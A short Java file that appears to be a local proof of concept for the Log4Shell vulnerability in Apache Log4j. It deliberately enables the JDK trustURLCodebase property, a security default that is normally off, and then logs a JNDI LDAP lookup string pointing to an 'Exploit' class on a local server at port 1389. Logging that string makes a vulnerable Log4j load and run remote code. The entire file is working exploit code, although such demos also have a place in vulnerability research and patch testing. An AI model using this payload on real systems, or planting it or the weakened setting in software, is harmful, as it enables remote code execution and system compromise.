import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jAceMain {
    private static final Logger logger = LogManager.getLogger(Log4jAceMain.class);

    public static void main(String[] args) {
        //The default trusturlcodebase of the higher version JDK is false
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
